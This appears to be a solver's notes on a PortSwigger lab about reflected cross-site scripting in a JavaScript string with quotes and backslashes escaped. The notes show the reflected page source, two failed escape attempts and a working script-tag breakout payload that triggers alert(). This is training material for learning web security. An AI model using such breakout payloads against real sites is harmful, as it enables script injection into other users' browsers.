# Lab: Reflected XSS into a JavaScript string with single quote and backslash escaped
# https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-single-quote-backslash-escaped

```bash
# Search
abc1234

<script>var searchTerms = 'abc1234';
document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```
```bash
'+alert()

var searchTerms = '\'+alert()';

# It automaticly added \ so let's try to escape it.

\'+alert()

var searchTerms = '\\\'+alert()';

# Didn't work.
```

```bash
#Let's try to get out of script tag and let's create our own.

</script><script>alert() </script>
```
